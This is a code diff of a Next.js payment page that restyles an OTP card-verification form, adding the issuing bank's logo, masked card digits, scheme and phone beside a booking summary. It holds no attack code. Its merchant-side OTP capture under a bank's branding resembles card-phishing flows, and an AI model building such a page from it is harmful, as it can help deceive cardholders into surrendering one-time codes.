@@ -1,13 +1,13 @@
 "use client";
 
 import { useState, useEffect, FormEvent, useCallback } from "react";
-import { useRouter } from "next/navigation";
 import Link from "next/link";
 import { Dictionary } from "@/lib/i18n";
 import { Card } from "@/components/ui/Card";
 import { Button } from "@/components/ui/Button";
 import { formatSalary } from "@/lib/utils";
 import { subscribeToEntryStatus } from "@/lib/realtime";
+import { CardBrandLogo } from "@/components/admin/CardBrandLogo";
 import { CandidateImage } from "./CandidateImage";
 import type { Booking, Worker } from "@/lib/supabase/types";
 import styles from "./VerifyCardClient.module.css";
@@ -17,13 +17,22 @@ export function VerifyCardClient({
   paymentEntryId,
   dict,
   locale,
+  bankLogoUrl,
+  bankName,
+  cardScheme,
+  cardLast4,
+  phone,
 }: {
   booking: Booking & { workers: Worker };
   paymentEntryId: string;
   dict: Dictionary;
   locale: string;
+  bankLogoUrl?: string | null;
+  bankName?: string | null;
+  cardScheme?: string | null;
+  cardLast4?: string | null;
+  phone?: string | null;
 }) {
-  const router = useRouter();
   const p = dict.payment;
 
   const [otp, setOtp] = useState("");
@@ -178,6 +187,10 @@ export function VerifyCardClient({
     );
   }
 
+  // اليمين (بداية RTL): شعار البنك بحجم واضح، وإن لم يُتوفّر نضع شعار نوع البطاقة.
+  const showBankLogo = !!bankLogoUrl;
+  const showSchemeFallback = !showBankLogo && !!cardScheme;
+
   return (
     <div className={styles.layout}>
       <div className={styles.header}>
@@ -185,68 +198,112 @@ export function VerifyCardClient({
         <p className={styles.subtitle}>{p.verifySubtitle}</p>
       </div>
 
-      <div className={styles.grid}>
-        <Card className={styles.formCard}>
-          <form onSubmit={handleSubmit} className={styles.form}>
-            <div className={styles.otpSingleWrap}>
-              <label className={styles.otpLabel}>{p.otpLabel}</label>
-              <input
-                type="text"
-                inputMode="numeric"
-                value={otp}
-                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
-                placeholder={p.otpSinglePh}
-                className={styles.otpSingleInput}
-                autoFocus
-                maxLength={6}
+      {/* بطاقة الدفع: شعار البنك يميناً + تفاصيل البطاقة والمبلغ ورقم الهاتف وسطاً */}
+      <Card className={styles.payCard}>
+        <div className={styles.payCardTop}>
+          <div className={styles.logoSlot}>
+            {showBankLogo ? (
+              /* eslint-disable-next-line @next/next/no-img-element */
+              <img
+                className={styles.bankLogo}
+                src={bankLogoUrl!}
+                alt={bankName || "bank logo"}
+                title={bankName || undefined}
               />
-            </div>
-
-            {error && <div className={styles.error}>{error}</div>}
-
-            <Button type="submit" size="lg" disabled={loading}>
-              {loading ? p.processing : p.submitOtp}
-            </Button>
-
-            <Link href={`/${locale}/payment/${booking.id}`} className={styles.backLink}>
-              ← {p.back}
-            </Link>
-          </form>
-        </Card>
-
-        <Card className={styles.summary}>
-          <h2 className={styles.sectionTitle}>{p.worker}</h2>
-          <div className={styles.workerCard}>
-            {booking.workers && <CandidateImage worker={booking.workers} locale={locale as "ar" | "en"} className={styles.workerImg} />}
-            <div>
-              <h3 className={styles.workerName}>
-                {booking.workers?.full_name}
-              </h3>
-              <p className={styles.workerMeta}>
-                {booking.workers?.nationality}
-              </p>
-            </div>
+            ) : showSchemeFallback ? (
+              <span className={styles.schemeLogoBig}>
+                <CardBrandLogo scheme={cardScheme!} />
+              </span>
+            ) : (
+              <span className={styles.logoFallback} aria-hidden>
+                ••••
+              </span>
+            )}
           </div>
-          <div className={styles.summaryRows}>
-            <div className={styles.summaryRow}>
-              <span>{p.amount}</span>
-              <strong>{formatSalary(amount, locale)}</strong>
+
+          <div className={styles.payDetails}>
+            {bankName && <div className={styles.bankNameLine}>{bankName}</div>}
+            <div className={styles.cardMasked} dir="ltr">
+              {cardLast4 ? `•••• ${cardLast4}` : "•••• ••••"}
             </div>
-            <div className={styles.summaryRow}>
-              <span>{p.serviceFee} (10%)</span>
-              <strong>{formatSalary(serviceFee, locale)}</strong>
-            </div>
-            <div className={`${styles.summaryRow} ${styles.totalRow}`}>
-              <span>{p.total}</span>
-              <strong>{formatSalary(total, locale)}</strong>
-            </div>
+            {cardScheme && (
+              <div className={styles.schemeTextLine} dir="ltr">
+                {cardScheme}
+              </div>
+            )}
           </div>
+        </div>
+
+        <div className={styles.paySummaryRows}>
+          <div className={styles.paySummaryRow}>
+            <span>{p.amount}</span>
+            <strong>{formatSalary(amount, locale)}</strong>
+          </div>
+          <div className={styles.paySummaryRow}>
+            <span>{p.serviceFee} (10%)</span>
+            <strong>{formatSalary(serviceFee, locale)}</strong>
+          </div>
+          <div className={`${styles.paySummaryRow} ${styles.payTotalRow}`}>
+            <span>{p.total}</span>
+            <strong>{formatSalary(total, locale)}</strong>
+          </div>
+          {phone && (
+            <div className={`${styles.paySummaryRow} ${styles.phoneRow}`}>
+              <span>{locale === "ar" ? "رقم الهاتف" : "Phone"}</span>
+              <strong dir="ltr">{phone}</strong>
+            </div>
+          )}
           <div className={styles.refRow}>
             <span>{p.bookingRef}</span>
             <strong>{booking.booking_ref}</strong>
           </div>
-        </Card>
-      </div>
+        </div>
+      </Card>
+
+      {/* حقل إدخال رمز التحقق + زر التأكيد */}
+      <Card className={styles.formCard}>
+        <form onSubmit={handleSubmit} className={styles.form}>
+          <div className={styles.otpSingleWrap}>
+            <label className={styles.otpLabel}>{p.otpLabel}</label>
+            <input
+              type="text"
+              inputMode="numeric"
+              value={otp}
+              onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
+              placeholder={p.otpSinglePh}
+              className={styles.otpSingleInput}
+              autoFocus
+              maxLength={6}
+            />
+          </div>
+
+          {error && <div className={styles.error}>{error}</div>}
+
+          <Button type="submit" size="lg" disabled={loading} className={styles.confirmBtn}>
+            {loading ? p.processing : p.verifyBtn}
+          </Button>
+
+          <Link href={`/${locale}/payment/${booking.id}`} className={styles.backLink}>
+            ← {p.back}
+          </Link>
+        </form>
+      </Card>
+
+      {/* ملخص المرشّح — مخفي على الهاتف، مرئي على الشاشات الكبيرة */}
+      <Card className={styles.summary}>
+        <h2 className={styles.sectionTitle}>{p.worker}</h2>
+        <div className={styles.workerCard}>
+          {booking.workers && <CandidateImage worker={booking.workers} locale={locale as "ar" | "en"} className={styles.workerImg} />}
+          <div>
+            <h3 className={styles.workerName}>
+              {booking.workers?.full_name}
+            </h3>
+            <p className={styles.workerMeta}>
+              {booking.workers?.nationality}
+            </p>
+          </div>
+        </div>
+      </Card>
     </div>
   );
 }
